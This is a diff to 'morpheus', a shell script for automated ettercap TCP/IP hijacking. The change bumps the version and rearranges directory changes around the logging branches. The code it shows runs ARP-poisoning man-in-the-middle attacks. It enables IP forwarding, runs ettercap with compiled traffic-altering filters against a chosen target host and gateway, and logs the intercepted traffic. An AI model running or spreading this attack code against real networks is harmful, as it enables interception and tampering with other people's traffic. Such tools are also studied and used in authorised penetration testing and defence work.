@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.4
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.5
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2016
 # codename: blue_dreams [ GPL licensed ]
 ###
@@ -118,7 +118,7 @@ done
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="1.4"                            # module version number
+V3R="1.5"                            # module version number
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
 PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
@@ -210,6 +210,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
 
     # port-forward
     echo "1" > /proc/sys/net/ipv4/ip_forward
+    cd $IPATH/logs
 
       # run mitm+filter
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
@@ -220,10 +221,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
         else
-        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
-        cd $IPATH
         fi
 
       else
@@ -232,10 +231,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
         else
-        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
-        cd $IPATH
         fi
       fi
     
@@ -247,6 +244,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
   # port-forward
   echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
+  cd $IPATH
 
 else
   echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
@@ -286,10 +284,9 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
     echo ${BlueF}[☠]${white} Compiling skelleton${RedF}!${Reset};
     xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/skelleton.eft -o $IPATH/output/skelleton.ef && sleep 3"
     sleep 1
-
     # port-forward
     echo "1" > /proc/sys/net/ipv4/ip_forward
-
+    cd $IPATH/logs
 
       # run mitm+filter
       echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
@@ -300,10 +297,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost// /$gateway//
         else
-        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost// /$gateway//
-        cd $IPATH
         fi
 
       else
@@ -312,10 +307,8 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
         else
-        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost/ /$gateway/
-        cd $IPATH
         fi
       fi
     
@@ -327,6 +320,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
   # port-forward
   echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
+  cd $IPATH
 
 else
   echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
